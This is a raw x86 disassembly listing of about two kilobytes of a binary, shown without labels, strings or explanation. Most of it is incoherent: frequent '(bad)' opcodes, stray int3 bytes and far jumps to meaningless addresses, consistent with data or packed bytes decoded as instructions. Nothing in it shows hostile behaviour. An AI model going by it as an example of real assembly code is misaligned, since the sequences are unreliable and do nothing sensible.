  403937:	and    ebp,0x0
  40393a:	add    BYTE PTR [ebx-0x1],dh
  40393d:	inc    edx
  40393e:	cmp    edi,edi
  403940:	mov    ah,0x83
  403942:	add    al,bl
  403944:	mov    DWORD PTR [esi+0x56],edi
  403947:	add    BYTE PTR ds:0xff698900,dl
  40394d:	ins    DWORD PTR es:[edi],dx
  40394e:	mov    bh,0xff
  403950:	fdivr  st,st(7)
  403952:	push   DWORD PTR [ebx]
  403954:	(bad)  
  403955:	mov    eax,0xfff60
  40395a:	(bad)  
  40395b:	aas    
  40395c:	int3   
  40395d:	jnp    0x4038f7
  40395f:	cmp    edi,0xffffffff
  403962:	add    BYTE PTR [ecx-0x1],ah
  403965:	xor    bh,cl
  403967:	int3   
  403968:	ret    
  403969:	add    bh,bh
  40396b:	rol    BYTE PTR [ebx-0x5a33f885],1
  403971:	(bad)  
  403972:	jmp    ebx
  403974:	add    BYTE PTR [ebx-0x14],bh
  403977:	add    BYTE PTR [eax+eax*1-0x7d],bl
  40397b:	jo     0x40397c
  40397d:	xor    BYTE PTR [edi-0x34],al
  403980:	jl     0x403981
  403982:	int3   
  403983:	jo     0x403985
  403985:	add    eax,0xf100ff
  40398a:	add    BYTE PTR [ecx],dl
  40398c:	add    BYTE PTR [esi-0x740082],ch
  403992:	add    dl,dh
  403994:	add    ah,al
  403996:	adc    esp,ecx
  403998:	int    0xff
  40399a:	inc    DWORD PTR [edx-0x1]
  40399d:	lahf   
  40399e:	repz inc ebx
  4039a1:	inc    DWORD PTR [eax]
  4039a3:	in     al,0x83
  4039a5:	and    esi,esp
  4039a7:	mov    DWORD PTR [eax-0x950000],eax
  4039ad:	mov    cl,0xa1
  4039af:	add    BYTE PTR [eax+eax*1+0x53ccf400],dh
  4039b6:	call   0x67:0x893400
  4039bd:	xor    ebx,ebx
  4039bf:	push   DWORD PTR ds:0xcc72ff89
  4039c5:	sti    
  4039c6:	lods   eax,DWORD PTR ds:[esi]
  4039c7:	jmp    FWORD PTR [esi-0x7d]
  4039ca:	xor    DWORD PTR [eax+eax*1+0x60],0xfffffffb
  4039cf:	jmp    FWORD PTR [eax]
  4039d1:	(bad)  
  4039d2:	call   FWORD PTR [ebp-0x7d]
  4039d5:	aam    0x9a
  4039d7:	mov    DWORD PTR [ebp+0xb5ffcc],edi
  4039dd:	aas    
  4039de:	adc    al,0x0
  4039e0:	pop    eax
  4039e1:	mov    edi,edi
  4039e3:	xchg   esi,eax
  4039e4:	adc    DWORD PTR [ebp+0xc5cc84],0xffffffcc
  4039eb:	add    edi,edi
  4039ed:	push   cs
  4039ee:	jo     0x4039bc
  4039f0:	sub    edi,edi
  4039f2:	jmp    FWORD PTR [ebx]
  4039f4:	add    BYTE PTR [ebp-0x22],dh
  4039f7:	add    BYTE PTR [ebp-0x2f0001],dl
  4039fd:	stc    
  4039fe:	in     eax,dx
  4039ff:	add    BYTE PTR [edi+edi*8+0x33ffda00],al
  403a06:	je     0x403a07
  403a08:	xchg   ebx,eax
  403a09:	(bad)  
  403a0a:	inc    DWORD PTR [edi-0x7d]
  403a0d:	cs sub al,0xff
  403a10:	sldt   WORD PTR [eax]
  403a13:	aad    0x0
  403a15:	lods   al,BYTE PTR ds:[esi]
  403a16:	or     eax,0xffff16cc
  403a1b:	push   esp
  403a1c:	jmp    FWORD PTR [edi]
  403a1e:	cmp    edi,edi
  403a20:	call   0xde27:0xffff00ff
  403a27:	add    BYTE PTR [edi+edi*8-0x58ff7501],dl
  403a2e:	sbb    eax,0xff000300
  403a33:	push   ebp
  403a34:	add    bl,bh
  403a36:	dec    eax
  403a37:	mov    DWORD PTR [ecx-0x77],ecx
  403a3a:	dec    edx
  403a3c:	call   FWORD PTR [ebp+0x5e]
  403a3f:	call   FWORD PTR [eax]
  403a41:	inc    DWORD PTR [eax]
  403a43:	out    0x89,al
  403a45:	enter  0x89de,0x8e
  403a49:	add    BYTE PTR [ebx+0x5b5400da],al
  403a4f:	mov    DWORD PTR [edx-0x723301],ecx
  403a55:	jmp    0x403ab4
  403a57:	inc    DWORD PTR [ecx]
  403a59:	(bad)  
  403a5a:	jmp    DWORD PTR [ecx+0x4b85ff]
  403a60:	push   ds
  403a61:	mov    edi,edi
  403a63:	retf   0xba00
  403a66:	(bad)  
  403a67:	inc    DWORD PTR [ecx+ecx*4]
  403a6a:	push   DWORD PTR [esi]
  403a6c:	int3   
  403a6d:	or     BYTE PTR [eax-0x1],bh
  403a70:	(bad)  
  403a71:	(bad)  
  403a72:	jmp    DWORD PTR [esi-0x7d]
  403a75:	iret   
  403a76:	jecxz  0x403a77
  403a78:	rol    DWORD PTR [eax],1
  403a7a:	add    BYTE PTR [ebp+0xd13cff],bh
  403a80:	call   0x8480:0xff448383
  403a87:	sub    DWORD PTR [ebp+0x0],0xffffffff
  403a8b:	and    eax,0xffcb9bff
  403a90:	stos   DWORD PTR es:[edi],eax
  403a91:	add    DWORD PTR [eax],0xffffffde
  403a94:	add    BYTE PTR [edx-0x12],cl
  403a97:	xor    DWORD PTR [ebx-0x33f40100],0x40
  403a9e:	clc    
  403a9f:	and    DWORD PTR [ecx-0x7c40ff7d],0xffffffda
  403aa6:	mov    ch,0x0
  403aa8:	and    bh,bh
  403aaa:	int3   
  403aab:	inc    DWORD PTR [bp+si+0x12]
  403aaf:	inc    DWORD PTR [ebx]
  403ab1:	(bad)  
  403ab2:	call   DWORD PTR [ebx+eax*4]
  403ab5:	dec    esi
  403ab6:	arpl   WORD PTR [eax],ax
  403ab8:	add    eax,0xffd6ffff
  403abd:	mov    ds:0x896effe8,eax
  403ac2:	call   DWORD PTR [ebp+0x0]
  403ac5:	sbb    DWORD PTR [esi-0x7d],0x65
  403ac9:	add    bh,bh
  403acb:	inc    ebx
  403acc:	mov    DWORD PTR [ebp-0x33e4ffc1],edx
  403ad2:	or     DWORD PTR ds:0x896ef4ff,0xf
  403ad9:	(bad)  
  403ada:	call   DWORD PTR [edx]
  403adc:	add    DWORD PTR [edx],0x11
  403adf:	add    BYTE PTR [ebx],cl
  403ae1:	mov    edi,edi
  403ae3:	idiv   edi
  403ae5:	adc    al,0x53
  403ae7:	jmp    ebx
  403ae9:	cmp    edi,0x14
  403aec:	int3   
  403aed:	fbld   TBYTE PTR [ecx-0x7d]
  403af0:	xor    bh,bh
  403af2:	add    BYTE PTR [ebp-0x77],bl
  403af5:	int3   
  403af6:	jmp    0x403af7
  403af8:	inc    WORD PTR [eax]
  403afb:	cdq    
  403afc:	add    BYTE PTR [ecx],bl
  403afe:	mov    al,ds:0xffffc4ff
  403b03:	mov    bl,0x83
  403b05:	inc    ebx
  403b06:	(bad)  
  403b07:	int3   
  403b08:	(bad)  
  403b09:	dec    esp
  403b0b:	sub    al,0x83
  403b0d:	pusha  
  403b0e:	add    DWORD PTR [ebx-0x19337cc3],0x0
  403b15:	or     eax,eax
  403b17:	add    BYTE PTR ds:0xffabffff,dh
  403b1d:	test   al,0xa7
  403b1f:	add    BYTE PTR [ecx-0x1],bh
  403b22:	inc    DWORD PTR [esi-0x72f800]
  403b28:	cmp    ecx,esp
  403b2a:	add    BYTE PTR [ebx-0x14c900],bl
  403b30:	nop
  403b31:	(bad)  
  403b32:	inc    DWORD PTR [ebx]
  403b34:	call   FWORD PTR [ecx-0x540023]
  403b3a:	push   DWORD PTR [ecx-0x9b7100]
  403b40:	cmp    al,0xff
  403b42:	int3   
  403b43:	xor    BYTE PTR [ecx+0x19ff985c],cl
  403b49:	(bad)  
  403b4a:	push   DWORD PTR [eax-0x475d00]
  403b50:	dec    DWORD PTR ss:[ecx+0x26cd0069]
  403b57:	push   DWORD PTR [ecx]
  403b59:	cmp    edi,0xffffff9a
  403b5c:	int3   
  403b5d:	xchg   BYTE PTR [edi],al
  403b5f:	(bad)  
  403b60:	(bad)  
  403b61:	inc    DWORD PTR [eax]
  403b63:	and    ecx,esp
  403b65:	mov    eax,ds:0x22007b
  403b6a:	(bad)  
  403b6b:	mov    ecx,0x26c0ff
  403b70:	pop    eax
  403b71:	add    BYTE PTR [ecx+0x483affff],cl
  403b77:	inc    DWORD PTR [ebx-0x336f0034]
  403b7d:	inc    edx
  403b7e:	inc    ecx
  403b7f:	adc    edi,0xffffffff
  403b82:	add    BYTE PTR [esi],cl
  403b84:	add    BYTE PTR [ebx-0x33bf7c14],cl
  403b8a:	or     DWORD PTR [edi+0x35ee89],0xffffffe3
  403b91:	add    BYTE PTR [eax],al
  403b93:	repz call DWORD PTR [edi-0x7caeff6a]
  403b9a:	jmp    DWORD PTR [edx+0x1479ff]
  403ba0:	leave  
  403ba1:	cmp    edi,0xffffffb6
  403ba4:	mov    eax,ebx
  403ba6:	and    BYTE PTR [ebx+0x3d83ff70],al
  403bac:	add    DWORD PTR [eax+eiz*8+0x0],0xffffffdf
  403bb1:	add    DWORD PTR [ebx-0x20d8763a],0xffffffff
  403bb8:	xchg   edx,eax
  403bb9:	inc    DWORD PTR [ebx-0x3ec1ff2d]
  403bbf:	add    BYTE PTR [esi],dl
  403bc1:	or     esp,0xffffffab
  403bc4:	dec    DWORD PTR [eax-0x8cfff8]
  403bca:	add    bh,al
  403bcc:	int3   
  403bcd:	add    DWORD PTR [ebp-0x1],edx
  403bd0:	and    eax,0xffdccccc
  403bd5:	jne    0x403bbf
  403bd7:	int3   
  403bd8:	bswap  esp
  403bda:	add    BYTE PTR [eax-0x15701],dh
  403be0:	pop    ebx
  403be1:	add    bh,bh
  403be3:	cmp    eax,0xc889cc
  403be8:	or     eax,DWORD PTR [ebx+0x72837bff]
  403bee:	jge    0x403b73
  403bf0:	add    BYTE PTR [eax],al
  403bf2:	call   DWORD PTR [edi+0x0]
  403bf5:	xchg   edx,eax
  403bf6:	push   ds
  403bf7:	add    BYTE PTR [esp+ecx*8],dl
  403bfa:	add    BYTE PTR [ecx-0x7cefd601],bh
  403c00:	pop    ds
  403c01:	mov    DWORD PTR [eax],eax
  403c03:	inc    ebp
  403c04:	add    cl,ah
  403c06:	inc    ebx
  403c07:	int3   
  403c08:	xor    edi,edi
  403c0a:	call   FWORD PTR [ecx]
  403c0c:	add    BYTE PTR [ebx-0x5c00f0],cl
  403c12:	or     DWORD PTR ds:0xff2ab4ff,0xffffffe7
  403c19:	mov    DWORD PTR [eax],eax
  403c1b:	cmp    bh,0x82
  403c1e:	mov    ?,edi
  403c20:	pop    esp
  403c21:	inc    DWORD PTR [eax]
  403c23:	fdiv   st(7),st
  403c25:	pushf  
  403c26:	mov    dl,0x83
  403c28:	out    0xff,eax
  403c2a:	mov    DWORD PTR [ebx-0x7d],esp
  403c2d:	pop    esi
  403c2e:	(bad)  
  403c2f:	int3   
  403c30:	mov    BYTE PTR [ecx+0x38ffa1ff],cl
  403c36:	mov    ah,0xff
  403c38:	adc    bh,bh
  403c3a:	jmp    FWORD PTR [eax-0x1]
  403c3d:	test   al,0x18
  403c3f:	jmp    DWORD PTR [edx]
  403c41:	mov    edi,edi
  403c43:	xor    al,BYTE PTR [eax]
  403c45:	fdiv   QWORD PTR [edi+edi*8+0xc8300c5]
  403c4c:	add    BYTE PTR [esi-0x3],bl
  403c4f:	or     DWORD PTR [esi],0x0
  403c52:	int3   
  403c53:	inc    edx
  403c54:	(bad)  
  403c55:	cmp    eax,0xffe100ba
  403c5a:	jmp    ebx
  403c5c:	mov    edi,esp
  403c5e:	cmp    edi,edi
  403c60:	cld    
  403c61:	(bad)  
  403c62:	(bad)  
  403c63:	jle    0x403c64
  403c65:	ret    0xb0
  403c68:	mov    esp,0xff4fffff
  403c6d:	sub    cl,al
  403c6f:	int3   
  403c70:	inc    eax
  403c71:	(bad)  
  403c72:	jmp    FWORD PTR [edx-0x1]
  403c75:	push   ss
  403c76:	mov    esi,0xffff74cc
  403c7b:	addr16 int3 
  403c7d:	pop    ebx
  403c7e:	jp     0x403c80
  403c80:	and    eax,0xcc3e0083
  403c85:	dec    edi
  403c86:	cmp    al,0xff
  403c88:	int    0x0
  403c8a:	(bad)  
  403c8b:	mov    ebp,0x89e6b583
  403c90:	in     eax,0xff
  403c92:	add    BYTE PTR [eax-0x1],dl
  403c95:	in     al,dx
  403c96:	lea    eax,[ebx-0xc00ff0d]
  403c9c:	mov    DWORD PTR [ebx+ebx*1+0x0],esp
  403ca0:	fild   WORD PTR [eax]
  403ca2:	mov    esp,ecx
  403ca4:	add    cl,cl
  403ca6:	dec    eax
  403ca7:	int3   
  403ca8:	aas    
  403ca9:	add    BYTE PTR [eax],al
  403cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cac:	and    DWORD PTR [ebx-0x7cf80008],0x0
  403cb3:	test   eax,0xff2e3183
  403cb8:	mov    al,ds:0xf2cc89
  403cbd:	jb     0x403d18
  403cbf:	call   DWORD PTR [ebx-0x820001]
  403cc5:	xchg   edx,eax
  403cc6:	std    
  403cc7:	mov    DWORD PTR [edx-0x7d],esp
  403cca:	mov    DWORD PTR [ecx-0x7d],esp
  403ccd:	out    dx,eax
  403cce:	add    BYTE PTR cs:[eax-0x77],al
  403cd2:	add    al,cl
  403cd4:	inc    DWORD PTR [edi]
  403cd6:	and    bh,bh
  403cd8:	out    0xcc,eax
  403cda:	add    BYTE PTR [eax-0xbd9700],ch
  403ce0:	pushf  
  403ce1:	(bad)  
  403ce2:	inc    DWORD PTR [eax+ebp*2]
  403ce5:	add    BYTE PTR [eax],al
  403ce7:	sahf   
  403ce8:	mov    esi,eax
  403cea:	sub    DWORD PTR [edx],0x3e
  403ced:	mov    DWORD PTR [ecx-0x1],edi
  403cf0:	xor    al,0x83
  403cf2:	push   DWORD PTR [edi]
  403cf4:	add    eax,0x899200ff
  403cf9:	test   BYTE PTR [eax],al
  403cfb:	sub    al,0xb8
  403cfd:	(bad)  
  403cfe:	mov    esi,0xff8343cc
  403d03:	xchg   esi,eax
  403d04:	push   ss
  403d05:	(bad)  
  403d06:	inc    DWORD PTR [ecx+0x1dffb9ff]
  403d0c:	jl     0x403cda
  403d0e:	outs   dx,DWORD PTR ds:[esi]
  403d0f:	jmp    FWORD PTR [ecx]
  403d11:	or     DWORD PTR [ecx-0xff907d],0x63
  403d18:	(bad)  
  403d19:	sbb    DWORD PTR ds:[edx],0x19
  403d1d:	jmp    DWORD PTR [edx-0x1]
  403d20:	hlt    
  403d21:	add    bh,bh
  403d23:	outs   dx,BYTE PTR ds:[esi]
  403d24:	call   0xffe3:0x91ffff
  403d2b:	call   0x9:0x838cff49
  403d32:	mov    DWORD PTR [edx],ebp
  403d34:	or     al,BYTE PTR [eax]
  403d36:	adc    DWORD PTR [ecx-0x1],0x44
  403d3a:	add    BYTE PTR [edx],cl
  403d3c:	std    
  403d3d:	jmp    FWORD PTR ds:0xfaff
  403d43:	in     eax,dx
  403d44:	or     eax,0xff87ff00
  403d49:	sti    
  403d4a:	(bad)  
  403d4b:	aas    
  403d4c:	adc    BYTE PTR [eax],al
  403d4e:	dec    edi
  403d4f:	and    DWORD PTR [edi+0x0],0xffffffff
  403d53:	mov    eax,0x7700ccab
  403d58:	push   edx
  403d5a:	jmp    FWORD PTR [eax+0x74ff5e]
  403d60:	loope  0x403d61
  403d62:	push   esp
  403d64:	xchg   edx,eax
  403d65:	inc    DWORD PTR [eax]
  403d67:	add    eax,0x2eff0b00
  403d6c:	leave  
  403d6d:	(bad)  
  403d6e:	mov    ebp,0xff8335ff
  403d73:	and    al,0x19
  403d75:	inc    DWORD PTR [eax]
  403d77:	adc    eax,0xbc8972ff
  403d7c:	retf   
  403d7d:	push   DWORD PTR [ebp-0xff4e01]
  403d83:	push   ebp
  403d84:	and    edi,edi
  403d86:	call   FWORD PTR [edi+edi*8]
  403d89:	idiv   edi
  403d8b:	aaa    
  403d8c:	push   cs
  403d8d:	add    BYTE PTR [esi+0xffd400],ch
  403d93:	inc    esi
  403d94:	or     edi,edi
  403d96:	add    BYTE PTR [ebp-0x3d7c5901],al
  403d9c:	ds add ah,al
  403d9f:	inc    esp
  403da1:	cmp    edi,0x2b
  403da4:	test   edi,edi
  403da6:	add    ah,ch
  403da8:	push   DWORD PTR [ecx]
  403daa:	add    DWORD PTR [ecx+0x9bff3d],0x73
  403db1:	dec    esp
  403db3:	aaa    
  403db4:	xor    BYTE PTR [ecx-0x71762d01],cl
  403dba:	push   esp
  403dbc:	mov    dl,0x0
  403dbe:	mov    ebp,0xff00f9ff
  403dc3:	js     0x403e1e
  403dc5:	inc    DWORD PTR [ebx-0x697ca8]
  403dcb:	xchg   ecx,eax
  403dcc:	sbb    bh,bh
  403dce:	mov    edx,0x3ccc
  403dd3:	mov    WORD PTR [eax-0x7cf90077],ss
  403dd9:	leave  
  403dda:	int3   
  403ddb:	cmp    al,0x80
  403ddd:	or     esi,0x0
  403de0:	push   cs
  403de1:	dec    DWORD PTR [ecx+0xeaa4]
  403de7:	mov    dh,0x0
  403de9:	outs   dx,BYTE PTR ds:[esi]
  403dea:	dec    DWORD PTR [edi+ebx*4+0x0]
  403dee:	xchg   ecx,eax
  403def:	inc    DWORD PTR [edx+0x0]
  403df2:	and    DWORD PTR ds:0x39cccc2d,0xffffffff
  403df9:	jp     0x403dfa
  403dfb:	push   edx
  403dfc:	add    eax,0xe7000fcc
  403e01:	add    bh,bh
  403e03:	js     0x403e20
  403e05:	add    bh,bh
  403e07:	mov    bh,0x0
  403e09:	leave  
  403e0a:	inc    DWORD PTR [ebx]
  403e0c:	jno    0x403d97
  403e0e:	push   edi
  403e0f:	jmp    FWORD PTR [edi+0x33b400ff]
  403e15:	cmp    edi,0x39
  403e18:	jmp    DWORD PTR [ebp-0x1]
  403e1b:	pushf  
  403e1c:	xchg   esp,eax
  403e1d:	call   FWORD PTR [esp+ecx*8+0x12]
  403e21:	mov    esp,ecx
  403e23:	mov    dh,ah
  403e25:	add    BYTE PTR [eax],al
  403e27:	nop
  403e28:	call   ebp
  403e2a:	push   DWORD PTR [ebx-0x7c1333a9]
  403e30:	mov    DWORD PTR [eax],0x5754cc
  403e36:	sbb    DWORD PTR [edi],0xffffffff
  403e39:	jmp    0x403e3a
  403e3b:	adc    esi,0x4e8321cc
  403e41:	(bad)  
  403e42:	jmp    FWORD PTR [ebp-0x66]
  403e45:	add    BYTE PTR [ebx+0xc6002f],al
  403e4b:	popf   
  403e4c:	xchg   ebx,eax
  403e4d:	cmp    DWORD PTR [ebp+0xccb883],0x19
  403e54:	and    DWORD PTR [eax],eax
  403e56:	(bad)  
  403e57:	fdivp  st(7),st
  403e59:	dec    eax
  403e5a:	jmp    FWORD PTR [ebx-0xbf00c1]
  403e60:	inc    ebx
  403e61:	inc    DWORD PTR [ebx+0x8997e1]
  403e67:	sbb    BYTE PTR [ebx+0x57e00b0],al
  403e6d:	adc    DWORD PTR [edx+0x3acc],0xffffffc9
  403e74:	retf   0x0
  403e77:	xor    edi,edi
  403e79:	rol    DWORD PTR [eax],1
  403e7b:	xor    DWORD PTR [eax+0x0],edi
  403e7e:	mov    BYTE PTR [eax],0xdf
  403e81:	mov    edi,edi
  403e83:	pop    edi
  403e84:	lods   eax,DWORD PTR ds:[esi]
  403e85:	inc    DWORD PTR [ebx-0x7c990067]
  403e8b:	mov    cl,BYTE PTR [esi]
  403e8d:	or     DWORD PTR [edx+0xcc7a83],0x26
  403e94:	add    eax,DWORD PTR [ebx-0x52008834]
  403e9a:	dec    DWORD PTR [ebp+0x2c0077]
  403ea0:	sbb    eax,0x168483ff
  403ea5:	mov    DWORD PTR [ecx-0x769a33d6],ecx
  403eab:	inc    esi
  403eac:	mov    edi,0x98930ff
  403eb1:	(bad)  
  403eb2:	jmp    FWORD PTR [ebx]
  403eb4:	mov    DWORD PTR [eax],eax
  403eb6:	inc    DWORD PTR [edx-0x6fffa901]
  403ebc:	push   edx
  403ebd:	push   DWORD PTR [edi]
  403ebf:	dec    DWORD PTR [edi+edi*8]
  403ec2:	call   DWORD PTR [edi+0x3]
  403ec5:	or     DWORD PTR [ecx-0x6fff32],0xffffffb5
  403ecc:	cmp    eax,0xc08346ff
  403ed1:	inc    DWORD PTR [eax]
  403ed3:	push   eax
  403ed4:	cwde   
  403ed5:	int3   
  403ed6:	cmp    DWORD PTR [ebx-0x50ffdc00],0xfffffffa
  403edd:	dec    DWORD PTR [ebx+0x0]
  403ee0:	jmp    0x403ee2
  403ee2:	mov    DWORD PTR [ebx+0x4b83ff63],esp
  403ee8:	add    BYTE PTR [edi-0x5db201],bh
  403eee:	add    bh,bh
  403ef0:	mov    ch,0x89
  403ef2:	(bad)  
  403ef3:	mov    edx,0x87ffff4f
  403ef8:	add    cl,cl
  403efa:	push   DWORD PTR [edi]
  403efc:	push   0x2ccc82ff
  403f01:	cmp    edi,0x39
  403f04:	mov    DWORD PTR [eax],0xda8958ff
  403f0a:	(bad)  
  403f0b:	cmp    eax,esp
  403f0d:	jmp    FWORD PTR [esi+0x83ff]
  403f13:	out    dx,eax
  403f14:	jl     0x403f16
  403f16:	xor    DWORD PTR [ebp+0x7a83d083],0x69
  403f1d:	jmp    DWORD PTR [ebp-0xffaf00]
  403f23:	push   eax
  403f24:	enter  0xff89,0x70
  403f28:	xor    esi,0xffffffff
  403f2b:	ret    0xcb
  403f2e:	mov    ebx,0x835700
  403f33:	in     eax,0xaf
  403f35:	int3   
  403f36:	int3   
  403f37:	dec    eax
  403f38:	add    al,al
  403f3a:	push   esi
  403f3c:	xchg   esp,eax
  403f3d:	int3   
  403f3e:	jb     0x403f40
  403f40:	dec    DWORD PTR fs:[ecx-0x36d]
  403f47:	xchg   ecx,eax
  403f48:	jmp    FWORD PTR [ecx]
  403f4a:	call   DWORD PTR [edi+0xeff80]
  403f50:	ins    BYTE PTR es:[edi],dx
  403f51:	inc    DWORD PTR [eax]
  403f53:	aas    
  403f54:	xor    bh,bh
  403f56:	int3   
  403f57:	and    al,0x0
  403f59:	adc    al,0x89
  403f5b:	or     al,0x72
  403f5d:	jmp    FWORD PTR [edi]
  403f5f:	add    BYTE PTR [edi-0x47bc0001],bl
  403f65:	add    bh,bh
  403f67:	push   es
  403f68:	add    ebx,0x0
  403f6b:	test   al,0x2c
  403f6d:	add    DWORD PTR [edi],0xffffffff
  403f70:	mov    eax,0x3e75cc83
  403f75:	add    bh,bh
  403f77:	aaa    
  403f78:	add    BYTE PTR [eax+eax*1],al
  403f7b:	adc    esi,DWORD PTR [edx+0x0]
  403f7e:	dec    esi
  403f7f:	(bad)  
  403f80:	cld    
  403f81:	add    BYTE PTR [eax],al
  403f83:	jmp    0xcb00:0xdb00ffbd
  403f8a:	and    esi,0xffffffcd
  403f8d:	add    BYTE PTR [edi],bl
  403f8f:	add    BYTE PTR [edi+edi*8-0x95f401],ah
  403f96:	add    dh,dl
  403f98:	int3   
  403f99:	stos   BYTE PTR es:[edi],al
  403f9a:	add    BYTE PTR [ebp+ebx*2+0x7c837283],ah
  403fa1:	(bad)  
  403fa2:	push   DWORD PTR [edi+0x6fff833b]
  403fa8:	(bad)  
  403fa9:	mov    edi,0x30583
  403fae:	pop    ds
  403faf:	call   DWORD PTR [edi-0x2578ff01]
  403fb5:	add    bh,bh
  403fb7:	pop    ebx
  403fb8:	jmp    FWORD PTR [ecx+ecx*4+0x1c]
  403fbc:	je     0x403f41
  403fbe:	jns    0x403fbf
  403fc0:	mov    bh,bh
  403fc2:	dec    DWORD PTR [edi]
  403fc4:	dec    edi
  403fc5:	add    bh,bh
  403fc7:	fiadd  DWORD PTR [eax]
  403fc9:	mov    dl,0x0
  403fcb:	jmp    0x403fe1
  403fcd:	(bad)  
  403fce:	out    dx,al
  403fcf:	jmp    DWORD PTR [edi-0x1]
  403fd2:	adc    DWORD PTR [ebp-0x79],0xffffffff
  403fd6:	mov    DWORD PTR [eax+eax*1+0x66d5004c],eax
  403fdd:	jmp    DWORD PTR [ecx+0xff7c89]
  403fe3:	inc    esi
  403fe4:	inc    BYTE PTR [eax]
  403fe6:	sbb    ebp,0xffffffcc
  403fe9:	out    0xff,eax
  403feb:	ins    BYTE PTR es:[edi],dx
  403fec:	xlat   BYTE PTR ds:[ebx]
  403fed:	add    bl,al
  403fef:	int3   
  403ff0:	std    
  403ff1:	cmp    edi,0xffffff84
  403ff4:	pop    eax
  403ff5:	(bad)  
  403ff6:	dec    DWORD PTR [ebx+eax*4]
  403ff9:	outs   dx,BYTE PTR ds:[esi]
  403ffa:	add    BYTE PTR [esi-0x62],ch
  403ffd:	jmp    DWORD PTR [eax]
  403fff:	mov    DWORD PTR [ecx-0x77],edx
  404002:	dec    esp
  404004:	aas    
  404005:	add    DWORD PTR [eax],0x7c
  404008:	call   edi
  40400a:	add    bh,ah
  40400c:	test   ah,cl
  40400e:	fdivr  st,st(7)
  404010:	(bad)  
  404011:	inc    DWORD PTR [eax]
  404013:	jecxz  0x403fff
  404015:	(bad)  
  404016:	jmp    FWORD PTR [ebx-0x34]
  404019:	cwde   
  40401a:	add    DWORD PTR [esi-0x2e],0x0
  40401e:	aas    
  40401f:	add    bh,dh
  404021:	(bad)  
  404022:	dec    DWORD PTR [esi]
  404024:	cs add bh,bh
  404027:	outs   dx,BYTE PTR ds:[esi]
  404028:	sbb    DWORD PTR [edi-0x1],0xffffffe5
  40402c:	and    DWORD PTR [ebx-0xcd00e4],eax
  404032:	inc    DWORD PTR [edi]
  404034:	pushf  
  404035:	add    DWORD PTR [ebx+0x12ffe2],0x24
  40403c:	sub    BYTE PTR [eax],al
  40403e:	ja     0x40403f
  404040:	out    dx,eax
  404041:	add    ah,cl
  404043:	jl     0x40404a
  404045:	(bad)  
  404046:	jmp    FWORD PTR [ecx-0x6ffed01]
  40404c:	fdivp  st(7),st
  40404e:	xchg   edi,eax
  40404f:	jmp    FWORD PTR [ebx-0x7d]
  404052:	push   edi
  404054:	or     edi,edi
  404056:	push   DWORD PTR [edx+0x0]
  404059:	mov    al,ds:0xffc94500
  40405e:	rol    DWORD PTR [ebx-0x5d003352],1
  404064:	mov    bh,0xff
  404066:	dec    DWORD PTR [edi-0x34]
  404069:	or     ecx,esp
  40406b:	(bad)  
  40406c:	or     al,0x83
  40406e:	sbb    eax,DWORD PTR [eax]
  404070:	cs add bh,bh
  404073:	shr    DWORD PTR [edx+0x0],0xff
  404077:	fadd   DWORD PTR [eax]
  404079:	leave  
  40407a:	(bad)  
  40407b:	cmp    eax,0xfff2ff0c
  404080:	test   edi,edi
  404082:	inc    DWORD PTR [esi+0x49]
  404085:	(bad)  
  404086:	jmp    esi
  404088:	inc    DWORD PTR [edi+edi*8-0x4b]
  40408c:	xor    edi,edi
  40408e:	mov    al,0x0
  404090:	lods   eax,DWORD PTR ds:[esi]
  404091:	add    bh,bh
  404093:	inc    edx
  404094:	sub    bh,bh
  404096:	call   DWORD PTR [esi-0x7d]
  404099:	jl     0x40409a
  40409b:	into   
  40409c:	sar    edi,1
  40409e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409f:	add    DWORD PTR [eax-0x1],0x0
  4040a3:	sbb    ebx,ecx
  4040a5:	(bad)  
  4040a6:	(bad)  
  4040a7:	fiadd  DWORD PTR [ebx+0x4dd2005a]
  4040ad:	inc    ebp
  4040af:	add    BYTE PTR [ecx+0x0],al
  4040b2:	(bad)  
  4040b3:	fcomp  DWORD PTR [edx]
  4040b5:	mov    edi,edi
  4040b7:	aad    0x83
  4040b9:	lds    eax,FWORD PTR [eax]
  4040bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040bc:	popf   
  4040bd:	inc    DWORD PTR [edx-0x77]
  4040c0:	arpl   WORD PTR [eax],ax
  4040c2:	sub    esp,0x13
  4040c5:	dec    DWORD PTR [ecx-0x7c0e00c2]
  4040cb:	mov    DWORD PTR [ebx-0x4d760c00],ecx
  4040d1:	add    BYTE PTR [eax],al
  4040d3:	xor    dl,ch
  4040d5:	(bad)  
  4040d6:	call   FWORD PTR [edi]
  4040d8:	add    BYTE PTR [ebp-0x7d],dh
  4040db:	lods   al,BYTE PTR ds:[esi]
  4040dc:	das    
  4040dd:	push   DWORD PTR [esp+ecx*8+0x2d]
  4040e1:	inc    DWORD PTR [eax]
  4040e3:	lsl    eax,WORD PTR [eax]
  4040e6:	int3   
  4040e7:	sti    
  4040e8:	add    BYTE PTR [ebp+0x0],cl
  4040eb:	adc    BYTE PTR [ebx+0x4aff4f00],bh
  4040f1:	inc    DWORD PTR [eax]
  4040f3:	out    dx,eax
  4040f4:	cmp    bh,bh
  4040f6:	add    cl,cl
  4040f8:	jmp    DWORD PTR [edi-0x1]
  4040fb:	lock mov esi,0xadff56ff
  404101:	add    bh,bh
  404103:	push   esi
  404104:	mov    BYTE PTR [eax],al
  404106:	xor    DWORD PTR [ecx-0x1],0xffffffbe
  40410a:	push   DWORD PTR [esi+0x4d00df]
  404110:	cwde   
  404111:	or     esp,0xffffffd6
  404114:	push   cs
  404115:	add    BYTE PTR [eax],al
  404117:	cdq    
  404118:	int3   
  404119:	adc    al,0x0
  40411b:	inc    ecx
  40411c:	rol    DWORD PTR [ebx-0x33c4ff3b],0xff
  404123:	stos   DWORD PTR es:[edi],eax
  404124:	loopne 0x404126
  404126:	jmp    DWORD PTR [esi-0x77]
  404129:	and    eax,DWORD PTR [ebx+0x5fffa30f]
  40412f:	dec    DWORD PTR [ebx+0x0]
  404132:	inc    DWORD PTR [edx]
  404134:	or     DWORD PTR [eax],eax
  404136:	sub    DWORD PTR [eax+eax*1+0x5fe6ff73],0x0
  40413e:	out    dx,eax
  40413f:	dec    DWORD PTR [ecx-0x1]
  404142:	push   DWORD PTR [ecx+0x708983db]
  404148:	jmp    eax
  40414a:	cmp    DWORD PTR [ebp+0x5c],0x0
  40414e:	add    edi,edi
  404150:	xor    eax,0xd1900ff
  404155:	inc    DWORD PTR [eax]
  404157:	mov    cl,0x83
  404159:	sub    al,0xff
